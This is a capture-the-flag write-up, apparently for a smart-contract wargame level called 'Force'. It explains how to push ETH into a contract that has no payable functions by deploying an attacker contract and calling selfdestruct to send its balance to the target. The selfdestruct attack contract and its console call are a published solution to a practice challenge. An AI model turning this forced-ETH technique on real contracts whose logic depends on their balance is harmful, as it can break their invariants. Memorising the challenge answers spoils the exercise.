# **Level 7 -- Force**
## **Contract to hack**
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

```

---
## ***Objectives***
* Make the balance of the contract greater than zero.
---
## ***Thought Process***
If you want a contract to be able to receive ETH, you need to add a `receive()` or `fallback()` function to the contract with a `payable` keyword. However since there are no functions in this contract, we can not send ETH to the contract directly.

Nevertheless, there is a special way to send ETH to any contract which is called `selfdestruct`. This function allows us to destroy a contract and send the balance of the contract to an address or another contract. Therefore, we need to create a contract with `selfdestruct` function and make sure the contract's balance is greater than zero. After that we call the `selfdestruct` function and send the ETH to the `Force` contract.

---
## ***Solution***
``` solidity
pragma solidity ^0.8.0;

contract ForceAttack {
    address levelInstance;
    
    constructor() public {}

    receive() payable{}

    function destroy(address to) external payable{
        selfdestruct(payable(to));

    }

}
```
1. send ETH to the contract

2. call `destroy` function
``` ts
> await contract.destroy(ForceAddress);
```



